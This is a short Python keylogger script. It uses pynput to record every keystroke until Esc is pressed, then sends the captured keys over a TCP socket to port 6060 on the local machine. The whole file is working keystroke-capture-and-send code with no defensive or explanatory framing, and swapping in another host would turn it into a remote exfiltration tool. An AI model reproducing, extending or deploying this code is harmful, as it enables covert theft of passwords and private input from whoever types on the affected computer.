import socket
import pynput

from pynput.keyboard import Key, Listener

keystroke = []

def on_press(key):
    keystroke.append(key)

def on_release(key):
    if key == Key.esc:
        return False
    
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(), 6060))

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

message = "".join(str(key) for key in keystroke)
s.sendall(message.encode())

response = s.recv(2048).decode()

print(f"Message received: {message}")
s.close()